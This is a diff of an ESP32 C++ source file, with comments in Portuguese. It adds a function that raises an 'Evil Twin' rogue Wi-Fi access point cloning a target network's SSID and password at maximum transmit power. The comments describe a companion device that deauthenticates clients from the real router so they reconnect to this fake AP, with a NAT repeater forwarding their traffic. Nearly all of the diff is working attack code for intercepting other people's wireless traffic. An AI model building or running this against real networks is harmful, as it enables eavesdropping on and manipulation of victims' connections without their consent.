@@ -1,38 +1,39 @@
 #include "funcoes_evtw.h"
 
-const char* SSID_ALVO = "GlubGlub"; 
-const char* SENHA_REAL = "congratulations"; 
+// ---------------------------------------------------------------------------
+// ESP #2 - EVIL TWIN (parte do AP falso)
+//
+// Sobe um AP com o MESMO SSID e senha do alvo, mas com o MAC PROPRIO da ESP
+// (NAO clona o BSSID). Assim a ESP #1 pode fazer deauth mirando so o BSSID
+// real sem derrubar os clientes que ja migraram para esta rede falsa.
+//
+// Quando o deauth derruba o cliente do roteador real, ele reconecta no SSID
+// de mesmo nome com sinal mais forte -> esta Evil Twin. A internet real e
+// fornecida pelo repetidor (NAT) em repetidor.cpp.
+// ---------------------------------------------------------------------------
 
-int canal_alvo = 1; 
-uint8_t bssid_alvo[6] = {0, 0, 0, 0, 0, 0};
+void configurarEvilTwin() {
+    Serial.println("Subindo AP Falso (Evil Twin) com MAC proprio...");
 
-void buscarCanalAlvo() {
-    Serial.println("Escaneando alvo para obter BSSID e Canal...");
-    WiFi.mode(WIFI_STA);
-    WiFi.disconnect();
-    delay(100);
+    WiFi.persistent(false);
+    WiFi.mode(WIFI_AP_STA);   // AP para as vitimas + STA para a internet real
+    delay(200);
 
-    int n = WiFi.scanNetworks();
-    bool encontrou = false;
+    WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
+                      IPAddress(192, 168, 4, 1),
+                      IPAddress(255, 255, 255, 0));
 
-    for (int i = 0; i < n; ++i) {
-        if (String(WiFi.SSID(i)) == String(SSID_ALVO)) {
-            canal_alvo = WiFi.channel(i);
-            memcpy(bssid_alvo, WiFi.BSSID(i), 6); 
-            
-            Serial.print(">> Alvo Encontrado! Canal: "); Serial.println(canal_alvo);
-            Serial.print(">> BSSID: ");
-            for (int j = 0; j < 6; j++) {
-                Serial.printf("%02X", bssid_alvo[j]);
-                if (j < 5) Serial.print(":");
-            }
-            Serial.println();
-            encontrou = true;
-            break; 
-        }
+    // Mesmo SSID/senha do alvo, no mesmo canal, ate 4 clientes.
+    bool ok = WiFi.softAP(SSID_ALVO, SENHA_REAL, canal_alvo, 0, 4);
+    if (ok) {
+        Serial.print(">> AP Falso no ar. SSID: ");
+        Serial.println(SSID_ALVO);
+        Serial.print(">> IP do AP: ");
+        Serial.println(WiFi.softAPIP());
+    } else {
+        Serial.println(">> ERRO ao subir o AP Falso.");
     }
-    WiFi.scanDelete(); 
-    if (!encontrou) {
-        Serial.println(">> AVISO: Alvo nao encontrado.");
-    }
+
+    esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
+    esp_wifi_set_max_tx_power(84);
 }
